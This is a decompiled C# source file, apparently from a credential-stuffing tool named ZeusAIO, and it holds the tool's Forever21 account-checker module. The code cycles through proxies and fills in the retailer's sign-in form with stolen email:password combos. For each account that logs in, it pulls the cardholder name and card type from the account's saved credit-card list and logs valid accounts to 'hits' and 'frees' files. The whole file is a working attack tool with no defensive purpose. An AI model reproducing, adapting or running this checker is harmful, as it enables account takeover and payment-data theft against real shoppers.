// Decompiled with JetBrains decompiler
// Type: Forever21.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace Forever21
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.AllowAutoRedirect = false;
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
              httpRequest.AddHeader("Pragma", "no-cache");
              httpRequest.AddHeader("Accept", "*/*");
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string str1 = Check.Parse(httpRequest.Get("https://www.forever21.com/us/shop/account/signin").ToString(), "window.NREUM||(NREUM={})).loader_config={xpid:\"", "\"");
              httpRequest.ClearAllHeaders();
              httpRequest.AddHeader("Host", "www.forever21.com");
              httpRequest.AddHeader("Connection", "keep-alive");
              httpRequest.AddHeader("Content-Length", "56");
              httpRequest.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
              httpRequest.AddHeader("X-NewRelic-ID", str1);
              httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
              httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36");
              httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
              httpRequest.AddHeader("Origin", "https://www.forever21.com");
              httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
              httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
              httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
              httpRequest.AddHeader("Referer", "https://www.forever21.com/us/shop/account/signin");
              httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
              httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
              string str2 = "userid=&id=" + s[0] + "&password=" + s[1] + "&isGuest=";
              string source1 = httpRequest.Post("https://www.forever21.com/us/shop/Account/DoSignIn", str2, "application/x-www-form-urlencoded").ToString();
              if (!source1.Contains("User cannot be found") && !source1.Contains("Your email or password is incorrect. Please try again."))
              {
                if (source1.Contains("\"ErrorMessage\":\"\""))
                {
                  string str3 = Check.Parse(source1, "\"UserId\":\"", "\"");
                  httpRequest.AddHeader("X-NewRelic-ID", str1);
                  string str4 = "userid=" + str3;
                  string source2 = httpRequest.Post("https://www.forever21.com/us/shop/Account/GetCreditCardList", str4, "application/x-www-form-urlencoded").ToString();
                  if (source2.Contains("Credit Card Information cannot be found."))
                  {
                    ++mainmenu.frees;
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[FREE - FOREVER21] " + s[0] + ":" + s[1], Color.OrangeRed);
                    Export.AsResult("/Forever21_frees", s[0] + ":" + s[1]);
                    return false;
                  }
                  if (source2.Contains("CardHolder") || source2.Contains("CardType") || source2.Contains("DisplayName"))
                  {
                    try
                    {
                      string str5 = Check.Parse(source2, ",\"CardHolder\":\"", "\",\"");
                      string str6 = Check.Parse(source2, ",\"CardType\":\"", "\",\"");
                      ++mainmenu.hits;
                      if (mainmenu.p1 == "2")
                        Colorful.Console.WriteLine("[HIT - FOREVER21] " + s[0] + ":" + s[1] + " | Card Holder: " + str5 + " | PaymentType: " + str6, Color.Green);
                      Export.AsResult("/Forever21_hits", s[0] + ":" + s[1] + " | Card Holder: " + str5 + " | PaymentType: " + str6);
                      return false;
                    }
                    catch
                    {
                      ++mainmenu.hits;
                      if (mainmenu.p1 == "2")
                        Colorful.Console.WriteLine("[HIT - FOREVER21] " + s[0] + ":" + s[1] + " | Error in Capture", Color.Green);
                      Export.AsResult("/Forever21_hits_cap_error", s[0] + ":" + s[1] + " | Error in Capture");
                      return false;
                    }
                  }
                  else
                    break;
                }
                else
                  break;
              }
              else
                break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    private static string Parse(string source, string left, string right) => source.Split(new string[1]
    {
      left
    }, StringSplitOptions.None)[1].Split(new string[1]
    {
      right
    }, StringSplitOptions.None)[0];
  }
}
